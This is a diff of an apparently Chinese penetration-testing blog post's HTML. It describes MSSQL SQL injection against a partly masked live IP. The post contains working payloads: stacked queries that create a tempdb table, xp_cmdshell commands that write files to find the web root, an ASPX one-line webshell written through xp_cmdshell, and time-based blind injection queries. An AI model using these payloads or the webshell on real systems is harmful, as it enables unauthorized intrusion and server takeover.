@@ -140,7 +140,7 @@ RECONFIGURE;
 <p>可以找一个在网站中的文件，然后可以用<code>dir /s /b d:\&quot;aa.txt&quot;</code>或者 for /r d:\ %i in (aa.txt) do echo %i来得到路径</p>
 <p>查看网页源代码发现引入了js脚本<code>&quot;&lt;script src=&quot;/Content/layer/layer.js&quot;&gt;&lt;/script&gt;&quot;</code>，就查找layer.js吧</p>
 <p>本来想使用sqlmap的--os-shell直接执行命令试试，python sqlmap.py -r 1.txt &ndash;os-shell，但是发现执行命令的话一直没有数据返回</p>
-<!-- raw HTML omitted -->
+<p>那就手工注入找路径，先建表，将路径插入表，然后得到表内容</p>
 <pre tabindex="0"><code>--在数据库tempdb下创建临时表tt_tmp
 uname=test&#39;;use tempdb;create table tt_tmp (tmp1 varchar(1000));--
 </code></pre><p>sqlmap查看建表成功，<code>sqlmap -r 1.txt --dbms &quot;Microsoft SQL Server&quot; -D &quot;tempdb&quot; --tables</code>
@@ -166,9 +166,8 @@ D:\bak\20170226\webapp\Content\layer\
 D:\bak\20170226\webappYM\Content\layer\
 D:\WEBAPP\Content\layer\
 </code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>uname<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39;;exec master..xp_cmdshell &#39;</span>echo test <span style="color:#f92672">&gt;</span>D:<span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170226</span><span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170403</span>.<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">\</span>webapp<span style="color:#960050;background-color:#1e0010">\</span>Content<span style="color:#960050;background-color:#1e0010">\</span>layer<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">11</span>.txt<span style="color:#e6db74">&#39;;--
-</span></span></span></code></pre></div><p>依次写文件然后访问，在写入 <code>D:\bak\20170226\webapp\Content\layer\123.txt</code>时，访问<code>http://111.*.*.59/Content/layer/123.txt</code>能正常访问到123.txt，返回内容为test，证明web路径就是D:\bak\20170226\webapp<br>
-<!-- raw HTML omitted -->
-尝试写入一句话(&lt; &gt;的前面要加^)</p>
+</span></span></span></code></pre></div><p>依次写文件然后访问，在写入 <code>D:\bak\20170226\webapp\Content\layer\123.txt</code>时，访问<code>http://111.*.*.59/Content/layer/123.txt</code>能正常访问到123.txt，返回内容为test，证明web路径就是D:\bak\20170226\webapp\</p>
+<p>尝试写入一句话(&lt; &gt;的前面要加^)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>uname<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39;;exec master..xp_cmdshell &#39;</span>echo <span style="color:#f92672">^&lt;%@</span> Page <span style="color:#66d9ef">Language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Jscript&#34;</span><span style="color:#f92672">%^&gt;^&lt;%</span>eval(Request.item[<span style="color:#e6db74">&#34;Aa1234567&#34;</span>],<span style="color:#e6db74">&#34;unsafe&#34;</span>);<span style="color:#f92672">%^&gt;</span> <span style="color:#f92672">&gt;</span> D:<span style="color:#960050;background-color:#1e0010">\</span>bak<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">20170226</span><span style="color:#960050;background-color:#1e0010">\</span>webapp<span style="color:#960050;background-color:#1e0010">\</span>Content<span style="color:#960050;background-color:#1e0010">\</span>layer<span style="color:#960050;background-color:#1e0010">\</span>cc.aspx<span style="color:#e6db74">&#39;;--
 </span></span></span></code></pre></div><p>访问时可以看到aa.aspx确实写入了，但是菜刀连接不上
 <img src="/img/post/Xnip2019-03-03_20-25-24.png" alt="70"></p>
@@ -204,7 +203,10 @@ D:\WEBAPP\Content\layer\
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">IF</span>(UNICODE(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">MIN</span>(<span style="color:#66d9ef">ISNULL</span>(<span style="color:#66d9ef">CAST</span>(tmp1 <span style="color:#66d9ef">AS</span> NVARCHAR(<span style="color:#ae81ff">4000</span>)),CHAR(<span style="color:#ae81ff">32</span>))) <span style="color:#66d9ef">FROM</span> tempdb.dbo.tt_tmp),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">32</span>) WAITFOR DELAY <span style="color:#e6db74">&#39;0:0:1&#39;</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">IF</span>(UNICODE(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">MIN</span>(<span style="color:#66d9ef">ISNULL</span>(<span style="color:#66d9ef">CAST</span>(tmp1 <span style="color:#66d9ef">AS</span> NVARCHAR(<span style="color:#ae81ff">4000</span>)),CHAR(<span style="color:#ae81ff">32</span>))) <span style="color:#66d9ef">FROM</span> tempdb.dbo.tt_tmp <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">CONVERT</span>(NVARCHAR(<span style="color:#ae81ff">4000</span>),tmp1)<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;D:\WEBAPP\Content\layer\layer.js&#39;</span>),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">16</span>) WAITFOR DELAY <span style="color:#e6db74">&#39;0:0:1&#39;</span>;
-</span></span></code></pre></div><!-- raw HTML omitted -->
+</span></span></code></pre></div><h4 id="reference侵删">Reference(侵删)：</h4>
+<ul>
+<li><a href="https://www.cnblogs.com/backlion/p/6869595.html?_blank">https://www.cnblogs.com/backlion/p/6869595.html</a></li>
+</ul>
 </div>
     </article>
   </main>
